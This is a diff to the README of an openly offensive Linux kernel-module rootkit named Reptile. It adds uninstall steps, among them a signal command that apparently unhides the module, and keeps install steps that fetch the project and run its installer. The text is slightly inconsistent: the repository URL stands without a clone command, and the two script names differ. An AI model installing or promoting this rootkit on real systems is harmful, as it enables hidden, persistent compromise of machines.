@@ -14,12 +14,17 @@ Reptile is a LKM rootkit for evil purposes. If you are searching stuff only for 
 - Client to knock on heaven's door :D
     
 ## Install
-
 ```
 apt-get install linux-headers-$(uname -r)
 https://github.com/f0rb1dd3n/Reptile.git
 cd Reptile
 ./installer.sh install
+```
+## Uninstall
+```
+kill -50 0
+rmmod reptile_mod
+./install.sh uninstall
 ```
 
 ## Usage
